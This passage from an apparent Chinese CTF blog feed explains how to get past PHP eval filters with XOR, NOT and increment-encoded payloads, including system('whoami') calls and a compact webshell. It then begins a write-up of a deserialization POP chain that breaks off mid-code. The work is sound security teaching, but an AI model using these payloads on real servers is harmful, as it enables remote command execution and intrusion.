class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__</span>.<span class="hljs-variable">$_</span>;(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;_&#x27;</span>])(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;__&#x27;</span>]);<br></code></pre></td></tr></table></figure><h2 id="绕过"><a href="#绕过" class="headerlink" title="_绕过"></a>_绕过</h2><p>之前的下划线只是作为变量名存在，可以使用其他字符代替下划线。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>    <br><span class="hljs-comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></td></tr></table></figure><p>任何字符与 0xff 异或都会取相反，这样就能减少运算量了。注意：测试中发现，传值时对于要计算的部分不能用括号括起来，因为括号也将被识别为传入的字符串，可以使用 <code>&#123;&#125;</code> 代替，原因是 PHP 的 use of undefined constant 特性。例如 <code>$&#123;_GET&#125;&#123;a&#125;</code> 这样的语句 PHP 是不会判为错误的，因为 <code>&#123;&#125;</code> 是用来界定变量的，这句话就是会将 <code>_GET</code> 自动看为字符串，也就是 <code>$_GET[&#39;a&#39;]</code>。后面那个 <code>()</code> 为的是能够动态执行传入的 PHP 函数。</p><p><img src="https://img.katck.com/images/2023/01/19/e474257197381ccfba80b21a10614fbd.png" alt="image-20230119101506260" style="zoom:50%;" /></p><p>如果想要执行代函数的函数比如 <code>system(&#39;whoami&#39;)</code>，那我们可以对后面括号里的参数做相同的编码处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>);&amp;%ff=system<br>$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);&amp;%ff=readfile<br>$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);&amp;%ff=highlight_file<br><span class="hljs-comment">// 即: </span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;whoami&#x27;);&amp;%ff=system</span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;flag.php&#x27;);&amp;%ff=readfile</span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;flag.php&#x27;);&amp;%ff=highlight_file</span><br></code></pre></td></tr></table></figure><h4 id="取反也是可以的"><a href="#取反也是可以的" class="headerlink" title="取反也是可以的"></a>取反也是可以的</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;~%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>$&#123;~%A0%B8%BA%AB&#125;&#123;%ff&#125;(~%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>);&amp;%ff=system<br></code></pre></td></tr></table></figure><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title=";绕过"></a>;绕过</h2><p>无需担心，前面我们已经说了，PHP 短标签中的代码不需要写分号，所以我们直接把所有的 PHP 语句改成短标签形式就行了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`&#123;$&#123;~<span class="hljs-string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//$_GET[%a0]</span><br>    <span class="hljs-comment">//code=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;&amp;%a0=whoami</span><br></code></pre></td></tr></table></figure><p>?&gt;闭合了eval自带的&lt;?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~”%a0%b8%ba%ab”为”_GET”，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。</p><h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="$绕过"></a>$绕过</h2><p>如果过滤了 <code>$</code>，那么像之前那些构造变量的方法全都不能用了。我们可以在不同版本的 PHP 环境中寻找突破。</p><h3 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h3><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p><p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br><span class="hljs-comment">//(&#x27;phpinfo&#x27;)();</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=(~%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">93</span>%<span class="hljs-number">93</span>%a0%<span class="hljs-number">8</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%a0%<span class="hljs-number">99</span>%<span class="hljs-number">8</span>a%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>c)(~%<span class="hljs-number">8</span>c%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">92</span>,~%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>e%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-comment">//call_user_func(system,whoami)</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%DF%D0);    <span class="hljs-comment">// system(&#x27;ls /&#x27;);</span><br></code></pre></td></tr></table></figure><h3 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h3><h5 id="通配符执行命令"><a href="#通配符执行命令" class="headerlink" title="通配符执行命令"></a>通配符执行命令</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">code=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`/???/??? ????.???`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中/???/??? ????.???匹配/bin/cat flag.php，这样也能得到flag。</p><h5 id="通过通配符匹配临时文件，使用反单引号执行"><a href="#通过通配符匹配临时文件，使用反单引号执行" class="headerlink" title="通过通配符匹配临时文件，使用反单引号执行"></a>通过通配符匹配临时文件，使用反单引号执行</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /???/????????[@-[]`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?&gt;&lt;?=`.+/<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f/<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f[<span class="hljs-meta">%</span><span class="hljs-number">40</span>-[]`<span class="hljs-meta">%</span><span class="hljs-number">3</span>b<span class="hljs-meta">%</span><span class="hljs-number">3</span>f&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/01/19/abab0451ab394e0657700c59b5f0c21b.png" alt="image-20230113222009790"></p><h2 id="绕过-3"><a href="#绕过-3" class="headerlink" title="[]绕过"></a>[]绕过</h2><p>有些情况下只能使用自增执行命令，但是<code>[]</code>也被过滤，我们需要其他方式来获取字符串</p><p>[]是为了构造Array然后转换成字符串的”Array”再截断。</p><p>[]被过滤了其实还可以利用NAN</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$___</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;; <span class="hljs-comment">//N</span><br></code></pre></td></tr></table></figure><p>在php的官方文档中是这样解释的:</p><p>“某些数学运算会产生一个由常量 NAN 所代表的结果。此结果代表着一个在浮点数运算中未定义或不可表述的值”</p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=++<span class="hljs-variable">$___</span>;--<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;<span class="hljs-variable">$______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;<span class="hljs-variable">$_______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$________</span>=<span class="hljs-variable">$______</span>;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>=(<span class="hljs-variable">$________</span>&#123;++<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$____________</span>=<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$_______</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_________</span>;<span class="hljs-variable">$__________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$___________</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__________</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$___________</span>=<span class="hljs-variable">$$___________</span>;<span class="hljs-variable">$____________</span>(<span class="hljs-variable">$___________</span>&#123;<span class="hljs-variable">$_______</span>&#125;);<br><br><span class="hljs-comment">//SYSTEM($_GET&#123;T&#125;)</span><br></code></pre></td></tr></table></figure><h2 id="字数限制"><a href="#字数限制" class="headerlink" title="字数限制"></a>字数限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$ctfshow</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ctfshow</span>) &lt;= <span class="hljs-number">84</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$ctfshow</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ctfshow</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;Are you hacking me AGAIN?&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>题目限制 <code>strlen($ctfshow) &lt;= 84</code> ，需要我们压缩代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=(_/_._)[<span class="hljs-number">0</span>];<span class="hljs-comment">//直接拼接成字符串并切片</span><br><span class="hljs-variable">$o</span>=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span><br><span class="hljs-variable">$o</span>=++<span class="hljs-variable">$a</span>.<span class="hljs-variable">$o</span>;<span class="hljs-comment">//$o=&gt;PO,$a=&gt;P</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-comment">//Q</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-comment">//R</span><br><span class="hljs-variable">$o</span>.=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=&gt;POS,$a=&gt;S</span><br><span class="hljs-variable">$o</span>.=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//$o=&gt;POST,$a=&gt;T</span><br><span class="hljs-variable">$_</span>=_.<span class="hljs-variable">$o</span>;<span class="hljs-comment">//_POST</span><br><span class="hljs-variable">$$_</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$$_</span>[_]);<span class="hljs-comment">//$_POST[0]($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>将a、o替换成不可见字符，url编码会将+替换成空格，所以自行编码成%2b</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf_show=$%ff=(_/_._)[<span class="hljs-number">0</span>];$%fe=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;$%fe=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff.$%fe;$%ff%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;$%ff%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;$%fe.=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;$%fe.=%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b$%ff;<span class="hljs-variable">$_</span>=_.$%fe;<span class="hljs-variable">$$_</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$$_</span>[_]);&amp;<span class="hljs-number">0</span>=system&amp;_=cat /f1agaaa<br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><h3 id="gettext插件利用"><a href="#gettext插件利用" class="headerlink" title="gettext插件利用"></a>gettext插件利用</h3><p>通过PHPINFO可以查看是否开启此插件</p><p>该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。这样有助于我们构造更短的Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">_</span>(a/a)[a];<span class="hljs-comment">//相当于gettext(0/0)[0],得到N</span><br><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//O</span><br><span class="hljs-variable">$_</span>=_.++<span class="hljs-variable">$a</span>.<span class="hljs-variable">$_</span>;<span class="hljs-comment">//_PO</span><br><span class="hljs-variable">$a</span>++;<span class="hljs-variable">$a</span>++;<span class="hljs-comment">//R</span><br><span class="hljs-variable">$_</span>.=++<span class="hljs-variable">$a</span>.++<span class="hljs-variable">$a</span>;<span class="hljs-comment">//_POST</span><br><span class="hljs-variable">$$_</span>[a](<span class="hljs-variable">$$_</span>[_]);<span class="hljs-comment">//$_POST[a]($_POST[_])</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023山石网科CTF冬令营结营赛Write Up</title>
    <link href="/2023/01/15/2023_hillstone_CTF/"/>
    <url>/2023/01/15/2023_hillstone_CTF/</url>
    
    <content type="html"><![CDATA[<p>还是太菜了，有几题该做出来没做出来。</p><p>这是第一篇文章，希望以后能持续输出。</p><p>为什么输出？<a href="https://zhuanlan.zhihu.com/p/88217284">https://zhuanlan.zhihu.com/p/88217284</a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h3><p>通过SplFileObject读hint.php的代码，但因为有过滤，不能直接读flag</p><p><img src="https://img.katck.com/images/2023/01/15/faee8c11aa6b4026e1697da23a2ffdca.png" alt="faee8c11aa6b4026e1697da23a2ffdca.png"></p><p>base64解码后审计代码</p><p>POP链：<code>red::__destruct() =&gt; white::__toString() =&gt; color::__execute() ==&gt; blue::__invoke() ==&gt; red::__call() ==&gt; color::getFlag()</code></p><p>然后将color类中的$c1设置为flag.php即可读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">blue</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">b1</span>(<span class="hljs-variable">$this</span>-&gt;b2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b1-&gt;<span class="hljs-title function_ invoke__">blue</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">red</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;r1 . <span class="hljs-string">&#x27;0xff0000&#x27;</span>; <span class="hljs-comment">#toString</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;r1)(); <span class="hljs-comment">#invoke</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;r1-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">white</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">color</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;c1)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;c1);<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$color1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>();<br><span class="hljs-variable">$white1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">white</span>();<br><span class="hljs-variable">$red1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>();<br><span class="hljs-variable">$blue1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">blue</span>();<br><span class="hljs-variable">$red2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">red</span>();<br><span class="hljs-variable">$color2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">color</span>();<br><span class="hljs-variable">$color2</span> -&gt; c1 = <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$red1</span> -&gt; r1 = <span class="hljs-variable">$white1</span>;<br><span class="hljs-variable">$white1</span> -&gt; w = <span class="hljs-variable">$color1</span>;<br><span class="hljs-variable">$color1</span> -&gt; c1 = <span class="hljs-variable">$blue1</span>;<br><span class="hljs-variable">$blue1</span> -&gt; b1 = <span class="hljs-variable">$red2</span>;<br><span class="hljs-variable">$red2</span> -&gt; r1 = <span class="hljs-variable">$color2</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span 